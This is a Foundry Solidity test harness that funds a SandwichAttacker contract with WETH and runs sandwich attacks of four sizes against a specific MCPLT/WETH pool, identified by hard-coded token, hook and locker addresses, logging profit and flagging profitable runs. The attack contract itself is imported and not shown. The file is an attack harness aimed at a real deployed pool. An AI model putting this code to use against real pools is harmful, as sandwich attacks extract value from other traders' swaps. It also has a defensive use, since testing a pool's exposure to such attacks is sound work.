// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "./Sandwich.t.sol";

contract SandwichMCPLTTest is Test {
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant LOCKER = 0x63D2DfEA64b3433F4071A98665bcD7Ca14d93496;
    address constant MCPLT = 0x0c09DB63f63f08C2438da91e9B38E5CDe7B68B07;
    address constant HOOK = 0xb429d62f8f3bFFb98CdB9569533eA23bF0Ba28CC;

    SandwichAttacker attacker;

    function setUp() public {
        attacker = new SandwichAttacker();
        deal(WETH, address(attacker), 1 ether);
    }

    function test_sandwichMCPLT() public {
        // MCPLT is currency0, WETH is currency1
        PoolKey memory key = PoolKey({
            currency0: MCPLT,
            currency1: WETH,
            fee: 0x800000,
            tickSpacing: int24(200),
            hooks: HOOK
        });

        uint256[] memory sizes = new uint256[](4);
        sizes[0] = 0.001 ether;
        sizes[1] = 0.005 ether;
        sizes[2] = 0.01 ether;
        sizes[3] = 0.05 ether;

        for (uint256 i = 0; i < sizes.length; i++) {
            deal(WETH, address(attacker), 1 ether);
            uint256 before = IERC20(WETH).balanceOf(address(attacker));

            try attacker.attack(MCPLT, LOCKER, sizes[i], key) {
                uint256 after_ = IERC20(WETH).balanceOf(address(attacker));
                int256 pnl = int256(after_) - int256(before);
                emit log_named_uint("SIZE", sizes[i]);
                emit log_named_int("PnL", pnl);
                if (pnl > 0) emit log("*** PROFITABLE ***");
            } catch {
                emit log_named_uint("FAILED at", sizes[i]);
            }
        }
    }
}
